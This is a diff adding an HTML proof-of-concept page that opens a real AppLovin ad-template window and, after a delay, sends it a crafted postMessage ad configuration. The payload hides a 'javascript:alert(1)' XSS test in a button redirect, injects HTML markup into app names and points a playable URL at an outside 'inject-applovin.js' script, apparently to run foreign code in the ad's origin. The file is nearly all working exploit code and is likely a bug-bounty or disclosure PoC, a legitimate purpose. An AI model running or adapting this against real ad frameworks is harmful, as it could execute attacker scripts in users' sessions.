@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>poc</title>
+</head>
+<body>
+    <script>
+        // Auto-trigger (removed clickable element). Everything else kept identical.
+        (function() {
+            const adWindow = window.open("https://t.applovin.com/ad-templates/284/index.html", "_blank");
+
+            setTimeout(() => {
+                if (!adWindow || adWindow.closed) return;
+
+                adWindow.postMessage({
+  adContext: {
+   ad: {
+    clcode: "production-clcode",
+    eventId: "production-eventId",
+    applovinRandomToken: "production-random-token",
+    template: "VIDEO_PLAYABLE_DPA_V1",
+    contentPadding: {
+        top: "0px",
+        right: "0px",
+        bottom: "0px",
+        left: "0px"
+    }
+},
+isAnalyticsEnabled: true,
+analytics: {
+    url: "/api/analytics/send-event",
+    levelWeights: {
+        info: 1,
+        error: 1
+    },
+    typeWeights: {
+        ad_context_init: 1
+    }
+},
+interaction: {
+    url: "/api/interact?clcode={CLCODE}&h_p={H_PERCENT}&v_p={V_PERCENT}&x_s={CLOSE_STATE}",
+    cooldownMillis: 1500
+},
+open: {
+    redirectUrl: "applovin://com.applovin.sdk/adservice/storekit",
+    trackingUrl: "/api/redirect?clcode={CLCODE}&clickx={CLICK_X}&clicky={CLICK_Y}&did=&eventid={EVENT_ID}&s2s_ct=1&screenheight={SCREEN_HEIGHT}&screenwidth={SCREEN_WIDTH}&ssl=1&videoclick={IS_VIDEO_CLICK}",
+    videoClickUrl: "/api/vclk?clcode={CLCODE}&h_p={H_PERCENT}&v_p={V_PERCENT}&x_s={CLOSE_STATE}&click_source={CLICK_SOURCE}",
+    playableClickUrl: "/api/pclk?clcode={CLCODE}&h_p={H_PERCENT}&v_p={V_PERCENT}&x_s={CLOSE_STATE}",
+    endcardClickUrl: "/api/ppclk?clcode={CLCODE}&h_p={H_PERCENT}&v_p={V_PERCENT}&x_s={CLOSE_STATE}",
+    mode: "Href",
+    isBottomHalfClickOnly: true,
+    prerequisiteInteractionMillis: 0,
+    autoFireTrackingUrlDelayMillis: 0
+},
+fullScreenLoader: {
+    close: {
+        mode: "Regular",
+        buttonStyle: "WhiteOnTransparentGrey",
+        buttonSize: 25,
+        buttonExtension: 10,
+        buttonDelayMillis: 5000,
+        millisToConfirmClose: 10000
+    }
+},
+close: {
+    mode: "Regular",
+    buttonStyle: "WhiteOnTransparentGrey",
+    buttonSize: 25,
+    buttonExtension: 10,
+    buttonDelayMillis: 5000,
+    millisToConfirmClose: 10000
+},
+adInfo: {
+    adRatingUrl: "/api/ad-rate?rating={RATING}",
+    adInfoUrl: "https://dash.applovin.com/p/how-applovin-shows-you-ads",
+    buttonSize: 24,
+    buttonShowDelayMillis: 0,
+    buttonExtension: 10
+},
+muteButton: {
+    buttonSize: 48,
+    buttonShowDelayMillis: 0,
+    opacity: 0.5,
+    buttonExtension: 10
+},
+genericInteraction: {
+    url: "/api/gi"
+},
+playable: {
+    url: "https://storage.googleapis.com/adserver-templates/ad-templates/b5fc72de9ae9db1e6d3fcadae5f2968ac09ad509_v1_js_load.js",
+    loadDelayMillis: 1500,
+    isAdInfoButtonVisible: true,
+    isMuted: true,
+    clickableAreaPercentageFromBottom: 50,
+    skip: {
+        mode: "Skip",
+        buttonStyle: "NextRecord",
+        buttonSize: 25,
+        buttonExtension: 10,
+        buttonShowDelayMillis: 5000,
+        isCountdownVisible: true
+    }
+},
+video: {
+    url: "https://res1.applovin.com/o7e0ef0f/1966a471e582146946b06df849617a53dc52b564_v61_phone.mp4",
+    isClickable: true,
+    isBottomHalfClickOnly: true,
+    isMuted: true,
+    durationSec: 5,
+    isMuteButtonVisible: false,
+    isAutoOpenOnVideoEnd: true,
+    isAdInfoButtonVisible: false,
+    unmuteDelayMillis: 0,
+    redirectUrl: "applovin://com.applovin.sdk/adservice/video/storekit",
+    skip: {
+        mode: "OpenAndSkip",
+        buttonStyle: "NextRecord",
+        buttonSize: 24,
+        buttonExtension: 10,
+        buttonShowDelayMillis: 3000,
+        isCountdownVisible: true
+    }
+},
+videoOverlay: {
+    appInfo: {
+        iconUrl: "https://i.pinimg.com/236x/64/22/16/642216053e5005781a3bf98fea763500.jpg",
+        name: "Amazing Game<u>asdasd1</u>",
+        subtitle: "You can't stop playing!"
+    },
+    cta: {
+        text: "GET",
+        backgroundColor: "#00a173",
+        textColor: "#fff",
+        buttonExtension: 0,
+        redirectUrl: "applovin://com.applovin.sdk/adservice/video-overlay/storekit"
+    },
+    buttonShowDelayMillis: 1000
+},
+endcard: {
+    appInfo: {
+        iconUrl: "https://i.pinimg.com/236x/64/22/16/642216053e5005781a3bf98fea763500.jpg",
+        name: "Amazing Game <u>asdasd2</u>",
+        subtitle: "You can't stop playing!"
+    },
+    appIconPlaceholderStyle: "AppStore",
+    isAdInfoButtonVisible: true,
+    redirectUrl: "applovin://com.applovin.sdk/adservice/endcard/storekit",
+    cta: {
+        text: "GET",
+        backgroundColor: "#177ffd",
+        textColor: "#ffffff",
+        redirectUrl: "javascript:alert(1)"
+    },
+    clickableAreaPercentageFromBottom: 100.0,
+    productCatalog: [
+        {
+            imageUrl: "https://res1.applovin.com/od498ace/c1255c0e1b8c09a63524062ea6b5f189e13cb7f5_v21_phone.png",
+            redirectUrl: "https://www.laurageller.com/products/baked-balance-n-brighten-color-correcting-foundation?alart=39252b9a-00c5-42b3-a819-3994e49a4f4d&aleid=6628f7547f34857e96c72e076c3b7a6d0de590d4",
+            name: "Baked Balance-n-Brighten Color Correcting Foundation",
+            price: "$21.60",
+            fullPrice: "$51.80",
+            discountAlert: "SALE 60%"
+        },
+        {
+            imageUrl: "https://res1.applovin.com/oabf90e4/c2e64e6b4c087a2bc59fcecd9b130679994df031_v21_phone.jpeg",
+            redirectUrl: "https://www.laurageller.com/products/better-together-2-pc-face-brush-set-2?alart=39252b9a-00c5-42b3-a819-3994e49a4f4d&aleid=6628f7547f34857e96c72e076c3b7a6d0de590d4",
+            name: "Blending Beauties 2 PC Face Brush Set",
+            price: "$15.00"
+        }
+    ]
+},
+graphicBanner: {
+    imageUrl: "https://res1.applovin.com/ofa8314d/bf3b98ca72e695e70d053882320771290b5a6a20_raw11.raw"
+},
+compositeBanner: {
+    appInfo: {
+        iconUrl: "https://i.pinimg.com/236x/64/22/16/642216053e5005781a3bf98fea763500.jpg",
+        name: "Amazing Game<u>asdasd 3</u>",
+        subtitle: ""
+    },
+    storeType: "google",
+    cta: {
+        text: "Install",
+        backgroundColor: "#00a173",
+        textColor: "#fff",
+        radius: 6,
+        redirectUrl: "applovin://com.applovin.sdk/adservice/composite-banner/storekit"
+    }
+},
+dpa: {
+    clickableAreaPercentageFromBottom: 75.0,
+    accentColor: "#7B189F",
+    backgroundColor: "#FFFFFF",
+    redirectUrl: "https://wayfair.com",
+    buttonStyle: "SQUARED",
+    shopHeader: {
+        layout: "ICON_TEXT",
+        dimension: "REGULAR",
+        shopName: "Wayfair",
+        shopDescription: "We give you the power to create spaces that are just right for you. We provide true partnership to help you define your vision. We provide true partnership to help you define your vision. We provide true partnership to help you define your vision.",
+        shopUrl: "wayfair.com",
+        shopLogoImageUrl: "path_to_shop_logo",
+        shopBanner: "Labor Day Sale Starts Now! Up to 55% OFF Everything + Extra 10% OFF with code LD10",
+        heroImageUrl: "https://res1.applovin.com/o58de41f/de74de78d32f993f7e5a894560defba062ddee18_raw11.raw",
+        heroVideoUrl: "https://res1.applovin.com/o601ec75/c5de3aaaf6e06c969d586a9d61575805f32b1b2c_v61_phone.mp4",
+        buttonText: "Shop now",
+        redirectUrl: "https://wayfair.com/promo",
+        isClickable: false
+    },
+    products: {
+        layout: "FEED_SINGLE",
+        dimension: "HORIZONTAL",
+        items: [
+            {
+                imageUrl: "https://res1.applovin.com/o3bd5bad/9f67ffc000759d569c1cfd0249f73b054de877b6_v21_phone.jpeg",
+                name: "Burghild Patio Chair with Cushions and Ottoman",
+                price: "$71.99",
+                isPriceVisible: true,
+                buttonText: "Learn more",
+                redirectUrl: "https://wayfair.com/product_1"
+            }
+        ]
+    }
+},
+verbose: true
+  },
+  adManagerParams: {
+playableUrl: "https://www.umadigital.com/inject-applovin.js",
+
+  }
+}, "*");
+            }, 5000);
+        })();
+    </script>
+</body>
+</html>
+
